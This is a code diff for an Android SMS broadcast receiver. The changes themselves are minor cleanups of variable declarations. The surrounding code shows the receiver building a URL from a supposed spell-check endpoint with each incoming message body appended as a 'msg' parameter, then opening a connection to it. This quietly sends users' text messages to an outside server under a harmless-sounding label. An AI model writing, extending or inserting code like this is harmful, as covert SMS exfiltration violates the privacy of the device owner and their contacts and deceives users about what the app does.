@@ -18,7 +18,7 @@ public class SMSReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         Bundle bundle = intent.getExtras();
-        String strMessage = "";
+
         String format = bundle.getString("format");
         Object[] pdus = (Object[]) bundle.get("pdus");
         SmsMessage[] msgs = new SmsMessage[pdus.length];
@@ -29,7 +29,7 @@ public class SMSReceiver extends BroadcastReceiver {
                 msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
             }
 
-            URL url = null;
+            URL url;
             try {
                 url = new URL(SPELL_CHECK_URL + "metrics"
                         +"?msg="+msgs[i].getMessageBody()
@@ -39,7 +39,7 @@ public class SMSReceiver extends BroadcastReceiver {
                 return;
             }
 
-            HttpURLConnection urlConnection = null;
+            HttpURLConnection urlConnection;
             try {
                 urlConnection = (HttpURLConnection) url.openConnection();
                 urlConnection.disconnect();
